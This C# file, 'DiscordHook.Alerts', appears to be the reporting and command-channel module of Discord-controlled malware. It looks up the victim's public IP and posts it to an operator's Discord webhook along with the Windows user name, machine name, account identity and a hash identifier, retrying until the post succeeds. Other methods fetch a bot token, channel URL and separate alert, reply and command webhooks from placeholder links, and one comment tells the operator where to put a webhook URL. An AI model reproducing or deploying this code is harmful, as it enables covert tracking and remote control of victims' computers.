using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace DiscordHook
{
    public static class Alerts
    {
        public static async Task<string> GetIpAsync()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("https://api.ipify.org");
                }
                catch 
                {
                    await Task.Delay(500);
                }
            }
        }

        public static async Task SendHookAlertAsync(string ip, string dshook, string hashprefix)
        {
            while (true)
            {
                try
                {
                    await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>{
                        {"content", $"```IP: {ip}\n" +
                                    $"Session name: {Environment.UserName}\n" +
                                    $"Computer name: {Environment.MachineName}\n" +
                                    $"Sha256 hash: {hashprefix}```"},
                        {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                        {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                    }));
                    break;
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }

        public static async Task<bool> CheckDiscordHook(string dshook)
        {
            try
            {
                await new HttpClient().GetStringAsync(dshook);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static async Task<string> GetAlertWebHook()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("link");
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
        
        public static async Task<string> GetReplyWebHook()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("link");
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }

        public static async Task<string> GetBotToken()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("link");
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
        
        public static async Task<string> GetChannelUrl()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("link");
                }
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
        
        public static async Task<string> GetCommandWebHook()
        {
            while (true)
            {
                try
                {
                    return await new HttpClient().GetStringAsync("link");   //make sure the link provides the webhook link in plain text
                }                                                       //or simply put your webhook url in the function return
                catch
                {
                    await Task.Delay(500);
                }
            }
        }
    }
}